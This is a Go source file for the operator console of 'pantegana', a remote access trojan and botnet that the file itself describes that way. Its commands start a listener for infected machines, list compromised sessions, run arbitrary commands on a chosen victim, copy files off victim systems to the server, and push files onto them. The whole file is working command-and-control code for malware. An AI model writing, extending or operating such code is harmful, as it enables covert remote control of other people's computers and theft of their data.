package server

import (
	"fmt"
	"strings"

	"github.com/desertbit/grumble"
	"github.com/fatih/color"
)

var cli = grumble.New(&grumble.Config{
	Name:                  "pantegana",
	Description:           "A RAT/Botnet written in Go",
	HistoryFile:           "/tmp/pantegana.hist",
	Prompt:                "[pantegana]$ ",
	PromptColor:           color.New(color.FgHiCyan, color.Bold),
	HelpHeadlineColor:     color.New(color.FgCyan),
	HelpHeadlineUnderline: true,
	HelpSubCommands:       true,

	Flags: func(f *grumble.Flags) {
		f.Bool("v", "verbose", false, "enable verbose mode")
	},
})

func init() {
	cli.SetPrintASCIILogo(func(a *grumble.App) {
		a.Println()
		a.Println("▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄    ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀█▄   ")
		a.Println("█   █   █ ▐ ▄▀ ▀▄ █  █ █ █ █    █  ▐ ▐  ▄▀   ▐ █         ▐ ▄▀ ▀▄ █  █ █ █ ▐ ▄▀ ▀▄ ")
		a.Println("▐  █▀▀▀▀    █▄▄▄█ ▐  █  ▀█ ▐   █       █▄▄▄▄▄  █    ▀▄▄    █▄▄▄█ ▐  █  ▀█   █▄▄▄█ ")
		a.Println("   █       ▄▀   █   █   █     █        █    ▌  █     █ █  ▄▀   █   █   █   ▄▀   █ ")
		a.Println(" ▄▀       █   ▄▀  ▄▀   █    ▄▀        ▄▀▄▄▄▄   ▐▀▄▄▄▄▀ ▐ █   ▄▀  ▄▀   █   █   ▄▀  ")
		a.Println("█         ▐   ▐   █    ▐   █          █    ▐   ▐         ▐   ▐   █    ▐   ▐   ▐   ")
		a.Println("▐                 ▐        ▐          ▐                          ▐                ")
		a.Println()
	})

	cli.AddCommand(&grumble.Command{
		Name:    "listen",
		Help:    "runs the listener",
		Aliases: []string{"l"},

		Flags: func(f *grumble.Flags) {
			f.Int("p", "port", 1337, "the port to listen (443 needs root but reccomend)")
			f.BoolL("notls", false, "set to remove encryption. Use mostly in testing.")
		},

		Args: func(a *grumble.Args) {
			a.String("host", "a host to listen to (use either a domain or ip)", grumble.Default("localhost"))
		},

		Run: func(c *grumble.Context) error {
			go StartListener(c.Args.String("host"), c.Flags.Int("port"), c.Flags.Bool("notls"))
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "exec",
		Help:    "executes a command to a session",
		Aliases: []string{"e"},

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * the sesssion to execute the command to.")
		},

		Args: func(a *grumble.Args) {
			a.StringList("cmd", "command to execute")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("session") == -1 {
				return ErrUndefinedSession
			}
			sessionId := c.Flags.Int("session")
			sessionObj, err := GetSession(sessionId)
			if err != nil {
				return err
			}

			go func(cmd string) {
				err = sessionObj.WriteToCmd(cmd)
				if err != nil {
					cli.PrintError(err)
				}
			}(strings.Join(c.Args.StringList("cmd"), " "))

			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "close",
		Help:    "closes the listener",
		Aliases: []string{"c"},

		Run: func(c *grumble.Context) error {
			err := CloseServer()
			if err != nil {
				return err
			}
			cli.Println("[+] Listener successfully closed")
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "sessions",
		Help:    "lists currently open sessions",
		Aliases: []string{"s"},

		Run: func(c *grumble.Context) error {
			PrettyPrintSessions()
			return nil
		},
	})

	cli.AddCommand(&grumble.Command{
		Name:    "upload",
		Help:    "transfer a file from a session to the server (ends up in uploads dir)",
		Aliases: []string{"up"},

		Args: func(a *grumble.Args) {
			a.String("source", "the name of the file on the session's system")
			a.String("destname", "the name that the file will have on the server's uploads dir", grumble.Default(""))
		},

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * the sesssion to execute the command to.")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("session") == -1 {
				return ErrUndefinedSession
			}
			sessionId := c.Flags.Int("session")
			sessionObj, err := GetSession(sessionId)
			if err != nil {
				return err
			}

			source := c.Args.String("source")
			dest := c.Args.String("destname")
			if dest == "" {
				dest = source
			}

			go func() {
				err = sessionObj.WriteToCmd(fmt.Sprintf("__upload__ %s %s", source, dest))
				if err != nil {
					cli.PrintError(err)
				}
			}()

			return nil
		},
	})

	cli.Stdout()

	cli.AddCommand(&grumble.Command{
		Name:    "download",
		Help:    "transfer a file from the server to a session (ends up in download dir)",
		Aliases: []string{"dl"},

		Args: func(a *grumble.Args) {
			a.String("source", "the name of the file on the servers's system")
			a.String("destname", "the name that the file will have on the session's uploads dir", grumble.Default(""))
		},

		Flags: func(f *grumble.Flags) {
			f.Int("s", "session", -1, " * the sesssion to execute the command to.")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("session") == -1 {
				return ErrUndefinedSession
			}
			sessionId := c.Flags.Int("session")
			sessionObj, err := GetSession(sessionId)
			if err != nil {
				return err
			}

			source := c.Args.String("source")
			dest := c.Args.String("destname")
			if dest == "" {
				dest = source
			}

			go func() {
				err = sessionObj.WriteToCmd(fmt.Sprintf("__download__ %s %s", source, dest))
				if err != nil {
					cli.PrintError(err)
				}
			}()

			return nil
		},
	})
}
